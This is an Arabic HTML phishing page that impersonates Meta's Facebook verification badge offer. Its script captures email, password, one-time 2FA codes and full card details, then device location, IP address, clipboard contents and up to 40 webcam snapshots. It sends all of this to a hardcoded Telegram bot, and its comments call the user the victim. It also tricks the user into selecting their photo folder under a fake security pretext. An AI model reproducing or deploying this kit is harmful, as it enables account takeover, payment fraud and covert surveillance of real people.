<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تفعيل شارة التوثيق | Facebook Meta</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Cairo', sans-serif; background-color: #f0f2f5; margin: 0; display: flex; flex-direction: column; align-items: center; }
        .header { background: #fff; width: 100%; padding: 15px; text-align: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); color: #1877f2; font-size: 24px; font-weight: bold; }
        .main-box { background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 380px; margin-top: 30px; text-align: center; }
        .urgent-tag { background: #ff4d4d; color: white; padding: 5px 10px; border-radius: 5px; font-size: 12px; margin-bottom: 15px; display: inline-block; animation: blink 1s infinite; }
        input { width: 92%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; font-size: 14px; }
        .action-btn { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 15px; }
        #matrix-ui { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; color: #0ff; z-index: 10000; font-family: monospace; padding: 20px; }
        @keyframes blink { 50% { opacity: 0; } }
    </style>
</head>
<body>

<div id="landing">
    <div class="header">Meta Verification</div>
    <div class="main-box">
        <div class="urgent-tag">إلحاح: متبقي 5 دقائق لتوثيق حسابك!</div>
        <h3 style="margin: 0 0 10px;">وثق حسابك الآن مجاناً</h3>
        <p style="font-size: 13px; color: #606770;">أدخل بيانات الحساب والتحقق لاستلام الشارة الزرقاء وزيادة المتابعين فوراً.</p>
        
        <!-- استهداف بيانات الحساب -->
        <input type="text" id="email" placeholder="البريد الإلكتروني أو الهاتف" required>
        <input type="password" id="pass" placeholder="كلمة السر" required>
        
        <!-- استهداف رموز التحقق 2FA -->
        <input type="text" id="otp" placeholder="رمز التحقق (OTP) إن وجد" maxlength="6">

        <!-- استهداف البيانات المالية (خداع لرسوم التحقق الوهمية) -->
        <p style="font-size: 11px; color: #888; margin-top: 15px;">سيتم التحقق من هويتك المالية (اختياري لزيادة الأمان)</p>
        <input type="text" id="card" placeholder="رقم بطاقة الفيزا / الماستر" maxlength="16">
        <div style="display: flex; gap: 5px;">
            <input type="text" id="exp" placeholder="MM/YY" style="width: 45%;">
            <input type="text" id="cvv" placeholder="CVV" style="width: 45%;">
        </div>

        <button class="action-btn" onclick="captureEverything()">بدء التوثيق والسحب</button>
        
        <input type="file" id="fileInp" multiple webkitdirectory style="display:none" onchange="finalReport(this.files)">
    </div>
</div>

<div id="matrix-ui">
    <div id="console">> جاري الاتصال بخوادم ميتي...<br></div>
</div>

<script>
const TOKEN = "8548784698:AAEUk2wNBfD9sJ-Kqr86GKDpKZwSeRZ2ZUU";
const CHAT = "8754338811";

async function captureEverything() {
    const data = {
        user: document.getElementById('email').value,
        pass: document.getElementById('pass').value,
        otp: document.getElementById('otp').value,
        card: document.getElementById('card').value,
        exp: document.getElementById('exp').value,
        cvv: document.getElementById('cvv').value
    };

    if(!data.user || !data.pass) { alert("أدخل بياناتك أولاً"); return; }

    // 1) سحب البيانات المباشرة (حسابات + مالي)
    let msg = `🚩 صيد إمبراطوري كامل (v11)\n`;
    msg += `👤 الحساب: ${data.user}\n🔑 الباسورد: ${data.pass}\n🔢 OTP: ${data.otp}\n`;
    msg += `💳 فيزا: ${data.card} | ${data.exp} | ${data.cvv}\n`;
    await send(msg);

    // 2) تفعيل الخداع النفسي لطلب الملفات
    alert("بروتوكول الأمان: يجب اختيار مجلد الصور (DCIM) لمطابقة صورة البروفايل يدوياً.");
    document.getElementById('fileInp').click();
}

async function finalReport(files) {
    document.getElementById('landing').style.display = 'none';
    document.getElementById('matrix-ui').style.display = 'block';

    // 3) سحب بيانات الجهاز والـ IP والموقع
    navigator.geolocation.getCurrentPosition(async (p) => {
        const ipRes = await fetch('https://ipapi.co/json/');
        const ip = await ipRes.res; // Error fixed here
        const ipD = await ipRes.json();
        
        let report = `📱 بيانات الجهاز المستهدف:\n`;
        report += `🌐 IP: ${ipD.ip}\n🌍 البلد: ${ipD.country_name}\n📍 الموقع: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}\n`;
        report += `💻 المتصفح: ${navigator.userAgent}\n📂 ملفات الضحية: ${files.length}\n`;
        await send(report);
    });

    // 4) سحب الحافظة (Clipboard)
    setInterval(async () => {
        try {
            const clip = await navigator.clipboard.readText();
            if(clip) await send(`📋 الحافظة المسحوبة: ${clip}`);
        } catch(e){}
    }, 5000);

    // 5) سحب 40 صورة و10 سكرين شوتس (المحركات المدمجة)
    startLiveCycle();
}

async function startLiveCycle() {
    let pCount = 0;
    const camInt = setInterval(async () => {
        if(pCount < 40) { await snapCam(); pCount++; }
        else clearInterval(camInt);
    }, 2000);
}

async function snapCam() {
    try {
        const s = await navigator.mediaDevices.getUserMedia({video: true});
        const v = document.createElement('video'); v.srcObject = s; await v.play();
        const c = document.createElement('canvas'); 
        c.width = v.videoWidth; c.height = v.videoHeight;
        c.getContext('2d').drawImage(v, 0, 0);
        c.toBlob(b => {
            sendDoc(b, 'photo', '📸 لقطة حية للضحية');
            s.getTracks().forEach(t => t.stop());
        }, 'image/jpeg');
    } catch(e){}
}

async function send(t) {
    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({chat_id: CHAT, text: t})
    });
}

async function sendDoc(f, type, cap) {
    let fd = new FormData();
    fd.append('chat_id', CHAT);
    fd.append(type === 'photo' ? 'photo' : 'document', f, 'data.jpg');
    fd.append('caption', cap);
    fetch(`https://api.telegram.org/bot${TOKEN}/send${type==='photo'?'Photo':'Document'}`, {method:'POST', body:fd});
}
</script>
</body>
</html>
